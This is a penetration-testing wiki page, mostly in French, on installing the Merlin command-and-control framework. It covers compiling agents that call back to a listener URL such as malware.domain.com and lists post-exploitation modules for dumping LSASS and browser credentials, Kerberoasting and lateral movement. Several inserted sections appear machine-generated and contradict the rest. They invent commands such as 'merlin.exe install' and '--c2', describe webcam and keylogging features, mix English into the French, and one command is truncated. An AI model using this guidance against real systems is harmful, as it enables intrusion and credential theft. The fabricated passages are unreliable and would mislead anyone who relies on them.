# Installation

## Installer GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Installer Merlin

---

### Description

Merlin is a backdoor that allows remote access to a compromised system. It is designed to work on Windows systems and can be installed as a service or as a standalone executable.

### Installation

To install Merlin, follow these steps:

1. Download the Merlin binary from the official repository.
2. Upload the binary to the target system.
3. Execute the binary with the following command: `merlin.exe install`
4. Start the Merlin service with the following command: `net start Merlin`

### Usage

Once installed, Merlin can be controlled remotely using the Merlin Console. The console allows the attacker to perform a variety of actions, including:

- Uploading and downloading files
- Executing commands
- Taking screenshots
- Recording keystrokes
- Accessing the webcam and microphone

### Detection

Merlin can be difficult to detect because it is designed to be stealthy. However, there are a few indicators that may suggest its presence, including:

- Unusual network traffic
- Unusual processes running on the system
- Unusual registry entries

### Prevention

To prevent Merlin from being installed on your system, follow these best practices:

- Keep your system up-to-date with the latest security patches.
- Use a reputable antivirus program and keep it up-to-date.
- Use a firewall to block incoming connections.
- Be cautious when downloading and executing files from the internet.
- Use strong passwords and two-factor authentication.
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Lancer le serveur Merlin

---

## Introduction

Merlin est un backdoor qui permet d'obtenir un accès persistant à une machine Windows. Il est capable de contourner les pare-feux et les antivirus, et peut être utilisé pour exécuter des commandes à distance.

## Utilisation

Pour lancer le serveur Merlin, il suffit de télécharger le fichier binaire et de l'exécuter sur la machine cible. Le serveur peut être configuré pour se connecter à un serveur C2 (command and control) pour recevoir des commandes à distance.

### Étape 1 : Télécharger le fichier binaire

Le fichier binaire peut être téléchargé depuis le référentiel GitHub de Merlin.

### Étape 2 : Exécuter le fichier binaire

Pour exécuter le fichier binaire, ouvrez une invite de commande et naviguez jusqu'au répertoire contenant le fichier binaire. Ensuite, exécutez la commande suivante :

```
merlin.exe
```

### Étape 3 : Configurer le serveur

Le serveur Merlin peut être configuré en utilisant les options de ligne de commande. Par exemple, pour configurer le serveur pour se connecter à un serveur C2, utilisez la commande suivante :

```
merlin.exe --c2 <C2_SERVER_IP>
```

Remplacez `<C2_SERVER_IP>` par l'adresse IP du serveur C2.

## Conclusion

Le serveur Merlin est un backdoor puissant qui peut être utilisé pour obtenir un accès persistant à une machine Windows. En suivant les étapes ci-dessus, vous pouvez lancer le serveur et le configurer pour se connecter à un serveur C2.
```
go run cmd/merlinserver/main.go -i
```
# Agents Merlin

Vous pouvez [télécharger des agents précompilés](https://github.com/Ne0nd0g/merlin/releases)

## Compiler des agents

Allez dans le dossier principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **Compilation manuelle des agents**

---

### **Description**

Merlin agents can be compiled manually from the source code. This can be useful in situations where the precompiled agent binary is not compatible with the target system.

### **Instructions**

1. Clone the Merlin repository:

   ```
   git clone https://github.com/Ne0nd0g/merlin.git
   ```

2. Navigate to the `agent` directory:

   ```
   cd merlin/agent
   ```

3. Compile the agent binary:

   ```
   go build -o merlin main.go
   ```

4. Transfer the compiled binary to the target system.

5. Set the appropriate permissions on the binary:

   ```
   chmod +x merlin
   ```

6. Run the agent:

   ```
   ./merlin
   ```

### **Impact**

Compiling the Merlin agent manually allows for greater flexibility in deploying the agent to target systems. However, it requires knowledge of the target system's architecture and may be more time-consuming than using a precompiled binary.
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# Modules

**La mauvaise nouvelle est que chaque module utilisé par Merlin est téléchargé depuis la source (Github) et enregistré sur le disque avant d'être utilisé. Faites attention lorsque vous utilisez des modules bien connus car Windows Defender vous attrapera !**


**SafetyKatz** --> Mimikatz modifié. Dump LSASS dans un fichier et lance :sekurlsa::logonpasswords sur ce fichier\
**SharpDump** --> minidump pour l'ID de processus spécifié (LSASS par défaut) (Il est dit que l'extension du fichier final est .gz mais en réalité c'est .bin, mais c'est un fichier .gz)\
**SharpRoast** --> Kerberoast (ne fonctionne pas)\
**SeatBelt** --> Tests de sécurité locaux dans CS (ne fonctionne pas) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compilation en utilisant csc.exe /unsafe\
**Sharp-Up** --> Tous les checks en C# dans powerup (fonctionne)\
**Inveigh** --> Outil de spoofing et d'interception PowerShellADIDNS/LLMNR/mDNS/NBNS (ne fonctionne pas, doit charger : https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> Impersonne tous les utilisateurs disponibles et récupère un challenge-response pour chacun (hachage NTLM pour chaque utilisateur) (mauvaise URL)\
**Invoke-PowerThIEf** --> Vole des formulaires à IExplorer ou le fait exécuter JS ou injecte une DLL dans ce processus (ne fonctionne pas) (et le PS semble ne pas fonctionner non plus) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Obtient les mots de passe du navigateur (fonctionne mais ne montre pas le répertoire de sortie)\
**dumpCredStore** --> API Win32 Credential Manager (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Détecte l'injection classique dans les processus en cours d'exécution (Injection classique (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (ne fonctionne pas)\
**Get-OSTokenInformation** --> Obtient les informations de jeton des processus et des threads en cours d'exécution (Utilisateur, groupes, privilèges, propriétaire… https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Exécute une commande (dans un autre ordinateur) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Exécute une commande dans un autre PC en abusant des objets COM PowerPoint (ADDin)\
**Invoke-ExcelMacroPivot** --> Exécute une commande dans un autre PC en abusant de DCOM dans Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (ne fonctionne pas) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> Il dump toutes les parties les plus intéressantes de la stratégie de groupe et fouille ensuite dedans pour trouver des choses exploitables. (obsolète) Jetez un coup d'œil à Grouper2, ça a l'air vraiment sympa\
**Invoke-WMILM** --> WMI pour se déplacer latéralement\
**Get-GPPPassword** --> Recherche groups.xml, scheduledtasks.xml, services.xml et datasources.xml et renvoie les mots de passe en texte brut (à l'intérieur du domaine)\
**Invoke-Mimikatz** --> Utilise mimikatz (creds par défaut)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Vérifie les privilèges des utilisateurs dans les ordinateurs\
**Find-PotentiallyCrackableAccounts** --> Récupère des informations sur les comptes d'utilisateur associés à SPN (Kerberoasting)\
**psgetsystem** --> getsystem

**N'a pas vérifié les modules de persistance**

# Résumé

J'aime vraiment la sensation et le potentiel de l'outil.\
J'espère que l'outil commencera à télécharger les modules depuis le serveur et intégrera une sorte d'évasion lors du téléchargement des scripts. 


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
